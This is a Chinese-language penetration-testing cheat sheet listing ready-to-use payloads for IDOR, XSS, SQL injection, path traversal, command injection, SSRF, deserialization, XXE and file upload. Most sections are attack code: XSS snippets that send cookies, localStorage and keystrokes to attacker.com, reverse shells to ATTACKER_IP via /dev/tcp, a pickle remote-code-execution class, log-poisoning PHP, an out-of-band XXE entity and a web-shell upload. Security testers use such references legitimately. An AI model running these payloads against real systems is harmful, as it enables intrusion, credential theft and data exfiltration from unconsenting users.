# 渗透测试快速参考 - 通用检查清单
**Keywords**: Penetration Testing, Security Testing, Checklist, Reconnaissance, Vulnerability Assessment, Web Application Security, OWASP

## 一、信息收集与漏洞识别

### 步骤1: 基本信息收集
```bash
# 获取应用基本信息
curl -I "http://target"

# 查看Server头识别服务器
# Server: Apache/2.4.50, nginx/1.19.0, etc.

# 识别应用框架
# HTML注释、标志性文件、特定参数

# 扫描所有端点
dirb http://target /usr/share/wordlists/dirb/common.txt
```

### 步骤2: 应用结构分析
```bash
# 识别输入点
# - GET/POST参数
# - Cookie值
# - HTTP头（X-User-ID, X-Admin, etc.）
# - JSON Body
# - XML/GraphQL查询

# 寻找受保护资源
# - /admin, /admin/*, /manage
# - /user/*, /profile
# - /api/*, /graphql
```

### 步骤3: 技术栈识别
```
1. 服务器：Apache, Nginx, IIS, ...
2. 后端语言：PHP, Python, Java, Node.js, ...
3. 数据库：MySQL, PostgreSQL, SQLite, MongoDB, ...
4. 框架：Django, Flask, Rails, Spring, Laravel, ...
5. 插件/库：Wordpress, 插件名称，版本
```

## 二、IDOR (不安全直接对象引用)

### 快速检查清单
```bash
# 1. 寻找ID参数
GET /user/123/profile  # /api/user/456
GET /order/789
GET /document/012

# 2. 修改ID测试
GET /user/456/profile  # 访问其他用户
GET /order/1           # 访问第一个订单
GET /user/999/admin    # 越权访问admin

# 3. 尝试ID变体
GET /user/456/profile
GET /user/456/details
GET /api/user/456
GET /user?id=456
GET /user?user_id=456

# 4. 测试HTTP方法
DELETE /user/456
PUT /user/456
PATCH /user/456
```

### 利用Payload
```bash
# 简单IDOR
curl "http://target/api/user/999/profile"

# IDOR + 修改
curl -X POST "http://target/api/user/999" \
  -d "name=hacked&role=admin"

# IDOR + 参数篡改
curl "http://target/api/user/999?filter=admin_only"
```

## 三、XSS (跨站脚本攻击)

### 快速检查清单
```bash
# 1. 寻找输入点
# - 搜索框
# - 用户名、邮箱
# - 评论、留言
# - URL参数
# - 上传的文件名

# 2. 基础测试
<script>alert('XSS')</script>
'"><script>alert('XSS')</script>
"><img src=x onerror=alert('XSS')>

# 3. 事件处理器测试
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe onload=alert('XSS')>

# 4. 字符编码绕过
&#x3c;script&#x3e;alert('XSS')&#x3c;/script&#x3e;
\x3cscript\x3ealert('XSS')\x3c/script\x3e
```

### 利用方法
```javascript
// 窃取cookies
fetch('http://attacker.com/?cookie=' + document.cookie);

// 窃取localStorage
fetch('http://attacker.com/?data=' + JSON.stringify(localStorage));

// 键盘记录
document.onkeypress = (e) => {
  fetch('http://attacker.com/?key=' + e.key);
};

// 读取敏感数据
fetch('/api/admin/users').then(r => r.json()).then(data => {
  fetch('http://attacker.com/?data=' + JSON.stringify(data));
});
```

## 四、SQL注入

### 快速检查清单
```bash
# 1. 寻找数据库查询点
# - 搜索框：name, search, q
# - 用户登录：username, password
# - 过滤：filter, category, type
# - 排序：sort, order

# 2. 基础测试
' OR '1'='1
' OR 1=1 --
admin' --
1' UNION SELECT NULL --

# 3. 数据库识别
' AND SLEEP(5) --           # MySQL/PostgreSQL
' AND 1=WAITFOR DELAY '00:00:05' --  # MSSQL
' AND DBMS_LOCK.SLEEP(5) --  # Oracle

# 4. 盲注检测
' AND '1'='1
' AND '1'='2
' AND 1>0
' AND 1<0
```

### 利用Payload库
```bash
# SQLMap自动化
sqlmap -u "http://target/search?q=test" -p q --dbs
sqlmap -u "http://target/login" --data "username=test&password=test" -p username --dbs
sqlmap -u "http://target/api/user/1" -p id --tables

# 手动UNION注入
' UNION SELECT NULL, NULL, NULL --
' UNION SELECT 1, 2, 3, 4, 5 --
' UNION SELECT database(), user(), version() --
' UNION SELECT table_name FROM information_schema.tables --
```

## 五、文件包含 & 路径遍历

### 快速检查清单
```bash
# 1. 寻找文件参数
# - file, page, include, path
# - template, view, module
# - download, attachment

# 2. 基础测试
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd

# 3. 文件类型测试
/etc/passwd
/etc/shadow
/proc/self/environ
/proc/self/cwd/index.php
/var/www/html/config.php

# 4. PHP wrapper
php://filter/convert.base64-encode/resource=/etc/passwd
php://input
php://data

# 5. 日志文件包含
/var/log/apache2/access.log
/var/log/nginx/access.log
```

### 利用方法
```bash
# 直接路径遍历
curl "http://target/download.php?file=../../etc/passwd"

# 编码绕过
curl "http://target/download.php?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# PHP filter + 日志包含RCE
# 1. 通过日志注入PHP代码
curl "http://target/" -A "<?php system('id'); ?>"

# 2. 包含日志文件
curl "http://target/view.php?file=php://filter/convert.base64-encode/resource=/var/log/apache2/access.log"
```

## 六、命令注入

### 快速检查清单
```bash
# 1. 寻找命令执行点
# - ping, traceroute, nslookup
# - 上传文件处理
# - 转码、编码功能

# 2. 分隔符测试
; id
| id
|| id
& id
&& id
` id `
$(id)
\n id

# 3. 检测成功
; whoami
; cat /etc/passwd
| ls -la
& ping -c 1 127.0.0.1
```

### 利用Payload库
```bash
# 基础命令
; cat /flag.txt
| whoami
|| id

# 盲命令注入（时间延迟）
; sleep 5
; ping -c 5 127.0.0.1

# 反向shell
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
| python -c 'import socket,...'
& powershell -c "..."
```

## 七、服务端请求伪造 (SSRF)

### 快速检查清单
```bash
# 1. 寻找URL参数
# - url, uri, fetch, download
# - image, picture, avatar
# - import, export, backup

# 2. 基础测试
http://127.0.0.1
http://localhost
http://169.254.169.254  # AWS metadata

# 3. 内部服务扫描
http://127.0.0.1:3306  # MySQL
http://127.0.0.1:5432  # PostgreSQL
http://127.0.0.1:6379  # Redis
http://127.0.0.1:8080  # 常见HTTP端口
```

### 利用方法
```bash
# 访问内部服务
curl "http://target/fetch?url=http://127.0.0.1/admin"

# 访问云元数据
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"

# 端口扫描
for port in 80 443 3306 5432 8080; do
  curl "http://target/fetch?url=http://127.0.0.1:$port"
done
```

## 八、认证绕过 & 权限提升

### 快速检查清单
```bash
# 1. 隐藏字段篡改
# 修改 <input type="hidden" name="isAdmin" value="false"> 
# 改为 value="true"

# 2. 参数篡改
# username=user → username=admin
# role=user → role=admin
# permission=read → permission=all

# 3. Cookie篡改
# 登录后修改cookie中的role字段

# 4. HTTP头篡改
# 添加: X-Admin: true
# 添加: X-User-Role: admin

# 5. 直接访问受保护资源
curl "http://target/admin"
curl "http://target/admin/users"
```

### 利用工具
```bash
# Burp Suite修改请求
# 1. 打开Proxy > Intercept
# 2. 修改参数/header
# 3. Forward发送

# 浏览器开发者工具
# 1. F12 打开控制台
# 2. 修改隐藏字段: document.querySelector('input[name="isAdmin"]').value='true'
# 3. 修改cookie: document.cookie="role=admin"
```

## 九、不安全反序列化

### 快速检查清单
```bash
# 1. 寻找序列化数据
# - Cookie中的base64数据
# - 上传的pickle/pickle文件
# - POST body中的序列化对象

# 2. 识别序列化格式
# PHP: a:2:{s:4:"name";s:5:"value";}
# Python: pickle数据
# Java: 二进制序列化数据

# 3. 利用
PHP: 修改数组值
Python: 上传恶意pickle
Java: gadget chain exploit
```

### Python反序列化RCE
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

payload = pickle.dumps(RCE())
# 发送payload给易受攻击的端点
```

## 十、XML外部实体 (XXE)

### 快速检查清单
```bash
# 1. 寻找XML处理
# - SOAP服务
# - XML上传
# - XML导入功能

# 2. 基础XXE测试
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

# 3. 盲XXE (OOB)
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/xxe.dtd">
  %dtd;
]>
<root></root>
```

## 十一、业务逻辑漏洞

### 快速检查清单
```
1. 价格操纵：修改购物车价格
2. 支付绕过：跳过支付步骤
3. 验证码绕过：暴力破解或跳过
4. 优惠券滥用：多次使用一次性优惠券
5. 积分系统：异常兑换逻辑
6. 流程绕过：跳过中间步骤
7. 业务规则绕过：利用逻辑漏洞
```

## 十二、文件上传漏洞

### 快速检查清单
```bash
# 1. 基础上传测试
curl -F "file=@shell.php" "http://target/upload.php"

# 2. 绕过技巧
# - 双扩展名：shell.php.jpg
# - 大小写混淆：shell.PHP
# - Null字节：shell.php%00.jpg
# - 修改MIME：shell.php as image/jpeg

# 3. 执行上传的文件
curl "http://target/upload/shell.php?cmd=id"
```

## 十三、通用利用工具

### 推荐工具
```bash
# 漏洞扫描
burp suite        # Web安全测试平台
sqlmap            # SQL注入自动化
wpscan            # WordPress漏洞扫描
nikto             # Web服务器扫描

# 信息收集
nmap              # 端口扫描
dirbuster/dirb    # 目录扫描
whatweb           # Web框架识别

# 利用辅助
Metasploit        # 渗透测试框架
exploitdb         # 漏洞利用库
payloadsallthings # Payload参考

# 其他
curl              # HTTP请求
python requests   # Python HTTP库
nc                # 网络工具
```

## 十四、漏洞优先级排序

### 严重性优先级

```
紧急 (需立即修复):
├─ 远程代码执行 (RCE)
├─ SQL注入
├─ 认证绕过
└─ 命令注入

高 (需快速修复):
├─ SSRF
├─ 文件包含/路径遍历
├─ 不安全反序列化
└─ XXE

中 (需修复):
├─ IDOR
├─ XSS
├─ CSRF
└─ 业务逻辑缺陷

低 (可修复):
├─ 信息泄露
├─ 默认凭据
└─ 版本泄露
```

## 十五、常用单行命令

```bash
# 快速目录扫描
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -t 100

# SQL注入快速测试
sqlmap -u "http://target/page.php?id=1" --dbs --batch

# 快速反向shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python HTTP服务器
python3 -m http.server 8000

# Base64编码/解码
echo "test" | base64
echo "dGVzdAo=" | base64 -d

# URL编码/解码
python3 -c "import urllib.parse; print(urllib.parse.quote('test'))"
```

